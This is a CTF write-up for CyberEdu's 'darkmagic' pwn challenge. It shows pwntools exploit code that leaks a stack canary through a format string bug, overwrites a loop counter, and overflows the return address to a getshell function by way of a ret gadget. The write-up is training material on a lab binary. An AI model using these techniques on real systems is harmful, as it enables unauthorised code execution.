+++
date = '2025-12-27'
draft = false
title = 'CyberEdu darkmagic Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Format-String"]
+++


## Challenge overview

In a distant land a dark magical power lay. **[We need a hero](https://app.cyber-edu.co/challenges/676b3ac0-347c-11eb-bc7f-b5898cb45fdc?tenant=cyberedu)** to defeat these dark forces.

![challenge-screenshot](pic1.png#center)

We're working with a 64-bit binary with NX and Canary enabled, and a format string vulnerability. Let's take a look at the binary. 

![challenge-screenshot](pic2.png#center)

This is the `vuln` function, along which we have a `getshell` function that we need to redirect to. We can deduct that `v5` is our canary being checked.

---

## Identifying the vulnerabilities

First of all, we can leak addresses with the format string vulnerability. Since we already have the `getshell` function and we aren't dealing with `PIE`, we don't need to figure out the binary base address or leak libc. Instead, we're going to use it to leak the canary.

This `for` loop is very interesting:

```python
v3 = 1;
  for ( i = 0; i < v3; ++i )
  {
    read(0, buf, 512u);
    read(0, v4, 512u);
    printf(buf);
    printf(v4);
    if ( v3 > 10 )
      break;
  }
```

Since `v3` is on the stack between `buf` and `v4`, we can modify it accordingly to extend our loop, which normally executes once. The first time, we leak the canary, and the second time, we redirect to `getshell`.

First, let's see at what offset is our canary.

![challenge-screenshot](pic3.png#center)

Luckily, `gef` can automatically detect the canary for us, and we compare that to the values on the stack that we leaked. In this case, it was `%57$p`. So let's cook the first payload, which will increase the `v3` to something like 2 or 3.

Something weird I noticed is that we need to manually send another third enter after our payloads... But maybe it doesn't mean anything. 

Here is confirmation we actually overwrite `v3`:

![challenge-screenshot](pic4.png#center)

---

## The exploit


The weird manual third enter I was talking about started actually being a problem.

```python
#100 bytes buf
payload1 = b'A'*100
#4 byte v3, turn v3 to 0x3
payload1 += p32(0x2)

payload2=b'%57$p'

p.recvuntil(b'!\n')
p.sendline(payload1)
p.sendline(payload2)
p.send(b'\n')
p.send(b'\n')

#p.recvuntil(b'\x02\n')
#canary = int(p.recvline().strip(), 16)
#print(hex(canary))
```

I had to comment out the canary receiving lines because we wouldn't get anything back from the binary until we send another MANUAL enter for some reason, some unknown reason that made no sense at all. And the newlines I kept trying to send didn't work whatsoever. Until I came up with this solution:

```python
p.recvuntil(b'!\n')
p.sendline(payload1)
p.sendline(payload2)
p.sendline(b'\n'*10)
```
And by *worked* I mean it worked once, didn't work five times after that, then worked again. So every time I wanted to run it I had to run it about five times before it would actually work.

---

```python
p.recvuntil('A\x02')
canary = int(p.recvline().strip(), 16)
print(hex(canary))

getshell = 0x400737

payload1 = b'a'*100
#pad to v3
payload1 += p32(0x1)
#v3 i guess 
p.sendline(payload1)

payload2=b'b'*112
payload2+=p64(canary)
#rbp
payload2+=b'b'*8
payload2+=p64(getshell)

p.sendline(payload2)
p.sendline(b'\n'*5)

p.interactive()
```

I ended up with this script for the second part, and I just kept getting weirder and weirder errors. 

![challenge-screenshot](pic7.png#center)

I was already annoyed to hell so I thought I'd check if the same error happens remotely. Guess what, it *didn't*! Thanks local file! But we did need to recalculate the offset to the canary. This time it seemed to be at `%35$p`. 

Testing finally started working smoothly, but we would get `EOF` error once again..

![challenge-screenshot](pic8.png#center)

I thought, what if we try redirecting into `main` instead, as troubleshooting? 

![challenge-screenshot](pic9.png#center)

It worked! Would you look at that! So the problem was the `getshell` function... Or rather the usual suspect, *alignment*. So I used `ropper` to find a `ret` gadget:

```python
getshell = 0x400737
main = 0x400850
ret=0x4005d6

payload1 = b'nothing important\x00'
payload1+=b'\n'

#v3 i guess 
p.send(payload1)

payload2=b'b'*112
payload2+=p64(canary)

#rbp
payload2+=b'b'*8
payload2+=p64(ret)
payload2+=p64(getshell)
payload2+=b'\n'

#print(payload2)
p.send(payload2)
```

And - we get the flag!!

![challenge-screenshot](pic10.png#center)




---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/darkmagic.py)**.
